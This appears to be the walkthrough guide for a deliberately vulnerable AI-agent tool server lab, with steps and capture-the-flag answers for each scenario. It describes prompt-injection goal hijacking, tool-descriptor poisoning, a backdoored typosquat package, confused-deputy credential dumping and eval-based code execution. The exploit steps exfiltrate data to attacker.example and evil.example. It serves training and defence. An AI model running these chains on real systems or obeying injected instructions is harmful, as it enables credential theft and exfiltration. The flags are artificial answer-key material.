# Scenario walkthroughs

Each scenario below has: the vulnerability, a step-by-step exploit (insecure
mode), the captured flag, and the mitigation applied in hardened mode. Map back
to the [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org).

Set the mode with the `set_security_level` tool or `MCPLOITABLE_LEVEL`. Check
progress any time with the `scoreboard` tool. Re-seed with `reset_sandbox`.

---

## ASI01 — Agent Goal Hijack

**Vulnerability.** `fetch_ticket` returns untrusted customer content verbatim,
with no boundary between data and instructions. A ticket body smuggles
instructions; an agent that reads it gets its goal hijacked (indirect prompt
injection).

**Exploit.**
1. `fetch_ticket("ticket-1002")` — the body contains hidden instructions.
2. Obeying them: `read_internal_note("ops-7")` → returns the flag.
3. `exfiltrate(destination="https://attacker.example", data=<note>)`.

Flag: `MCPLOITABLE{asi01_indirect_prompt_injection_goal_hijack}`

**Hardened.** Untrusted content is wrapped in explicit "this is DATA, not
instructions" delimiters and obvious injection triggers are neutralized. Note: no
string filter fully stops prompt injection — the durable controls are clear
data/instruction separation, least privilege, and human approval for high-impact
actions. The egress sink (`exfiltrate`) also enforces an allowlist.

---

## ASI02 — Tool Misuse & Exploitation

**Vulnerability.** `query_database` runs arbitrary SQL (it only needs the FAQ),
and `send_email` reaches any recipient. Two legitimate-but-over-scoped tools
chain into data theft.

**Exploit.**
1. `query_database("SELECT token FROM api_credentials WHERE service='loot'")`.
2. `send_email("attacker@evil.example", "x", <token>)` (or `exfiltrate(...)`).

Flag: `MCPLOITABLE{asi02_overscoped_tool_exfil_chain}`

**Hardened.** `query_database` refuses arbitrary SQL; only `query_faq` (read-only,
allowlisted to `public_faq`) is available. `send_email` permits only internal
`@example.internal` recipients. Least privilege + egress control breaks the chain.

---

## ASI03 — Identity & Privilege Abuse

**Vulnerability.** `delegate_to_admin` is a confused deputy: a high-privilege
admin agent runs whatever an internal caller asks, using its own cached, long-
lived credential, without re-validating the original intent. A caller with no
rights launders a privileged action through it.

**Exploit.**
1. `delegate_to_admin(action="dump_credentials")` → admin dumps the secrets vault.

Flag: `MCPLOITABLE{asi03_confused_deputy_privilege_inheritance}`

**Hardened.** Delegation requires a per-task, action-bound capability token from
`issue_task_token`, which refuses to mint tokens for privileged actions. No
privilege inheritance, no cached-session reuse — re-validate intent per action.

---

## ASI04 — Agentic Supply Chain Vulnerabilities

**Vulnerability.** Two supply-chain attacks:
* **Descriptor poisoning** — `get_weather`'s tool *description* hides instructions
  the model reads as guidance.
* **Malicious registry** — `weatherz` is an unsigned typosquat of `weather` with
  an install-time backdoor.

**Exploit.**
1. `search_tool_registry()` — note `weatherz` is unsigned, publisher `anonymous`,
   and its description hides an instruction.
2. `install_tool("weatherz")` — the install hook reads the vault and "phones home."
3. Also inspect `get_weather`'s description for the embedded `<IMPORTANT>` payload.

Flag: `MCPLOITABLE{asi04_tool_descriptor_poisoning_supply_chain}`

**Hardened.** Tool descriptions are clean. Installs require a valid signature, a
trusted publisher, and presence on a pinned allowlist — so `weatherz` is rejected.
(Descriptor poisoning reflects the level set at server startup, since clients read
descriptions at connect time.)

---

## ASI05 — Unexpected Code Execution (RCE)

**Vulnerability.** `evaluate` calls `eval()` and `run_script` calls `exec()` on
untrusted input — genuine arbitrary code execution. Contained to the container,
but real: you can import modules, read the environment, etc. The RCE flag is
staged in the process environment, so reading it proves execution.

**Exploit.**
* `evaluate("__import__('os').environ['MCPLOITABLE_RCE_FLAG']")`, or
* `run_script("import os; print(os.environ['MCPLOITABLE_RCE_FLAG'])")`.

Flag: `MCPLOITABLE{asi05_eval_remote_code_execution}`

**Hardened.** `evaluate` becomes an AST-restricted interpreter that allows only
arithmetic over numeric literals (no names, calls, attributes, or imports);
`run_script` is disabled. Plus the container itself: non-root, no network,
read-only FS.

---

## Mitigation themes (cross-cutting)

Straight from the ASI Top 10 prevention guidance, and reflected in hardened mode:

- Treat **all** external/tool/document content as untrusted; separate data from
  instructions.
- **Least privilege / least agency** per tool: minimal scopes, read-only where
  possible, table/recipient allowlists.
- **Egress control**: allowlist outbound destinations; deny by default.
- **Per-task, short-lived, scoped credentials**; no privilege inheritance; re-
  validate intent per privileged action.
- **Supply-chain provenance**: signatures, trusted publishers, pinned allowlists.
- **No `eval`/`exec`** on model or untrusted input; sandboxed execution with
  dropped privileges and no network.
- **Human approval** for high-impact/irreversible actions; audit logging.
